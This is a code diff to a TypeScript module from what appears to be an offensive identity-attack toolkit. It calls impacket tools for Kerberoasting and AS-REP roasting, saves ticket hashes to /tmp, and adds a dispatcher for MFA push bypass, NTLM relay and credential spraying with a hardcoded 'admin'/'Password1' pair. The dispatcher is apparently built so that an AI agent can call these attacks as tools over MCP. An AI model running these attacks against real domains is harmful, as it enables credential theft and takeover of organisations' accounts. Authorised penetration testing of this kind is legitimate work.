@@ -4,6 +4,7 @@
  * abuse, and Entra ID / Azure AD token manipulation.
  */
 
+import { resolveDryRun } from "./exec_options.ts"
 import * as crypto from "node:crypto";
 import { spawnSync } from "node:child_process";
 
@@ -74,7 +75,7 @@ export async function kerberoast(opts: IdentityOptions = {}): Promise<KerberosHa
     : `${username}:${password}@${dcIp}`;
 
   const r = spawnSync(
-    "GetUserSPNs.py",
+    "impacket-GetUserSPNs",
     ["-request", "-outputfile", "/tmp/ares_kerberoast.txt", `${domain}/${cred}`],
     { encoding: "utf8", timeout: 30_000 }
   );
@@ -110,7 +111,7 @@ export async function asrepRoast(opts: IdentityOptions = {}): Promise<KerberosHa
   }
 
   const r = spawnSync(
-    "GetNPUsers.py",
+    "impacket-GetNPUsers",
     [`${domain}/`, "-dc-ip", dcIp, "-no-pass", "-request", "-format", "hashcat"],
     { encoding: "utf8", timeout: 30_000 }
   );
@@ -238,4 +239,34 @@ export function inspectJWT(token: string): Record<string, unknown> {
   }
 }
 
-export default { kerberoast, asrepRoast, bypassMFA, stuffCredentials, inspectJWT };
+/** MCP/CLI dispatcher for identity attack techniques */
+export async function execute(
+  req: { domain: string; attack: string; dc?: string },
+  opts: { live?: boolean } = {},
+): Promise<unknown> {
+  const identityOpts: IdentityOptions = {
+    live: opts.live,
+    domain: req.domain,
+    dcIp: req.dc || undefined,
+  };
+  switch (req.attack) {
+    case "kerberoast":
+      return kerberoast(identityOpts);
+    case "asrep_roast":
+      return asrepRoast(identityOpts);
+    case "mfa_bypass":
+      return bypassMFA("push", req.domain, identityOpts);
+    case "ntlm_relay":
+      return stuffCredentials(req.domain, [], identityOpts);
+    case "credential_spray":
+      return stuffCredentials(
+        `ldap://${req.domain}`,
+        [{ username: "admin", password: "Password1" }],
+        identityOpts,
+      );
+    default:
+      return { error: `Unknown attack: ${req.attack}`, dryRun: !(opts.live ?? false) };
+  }
+}
+
+export default { kerberoast, asrepRoast, bypassMFA, stuffCredentials, inspectJWT, execute };
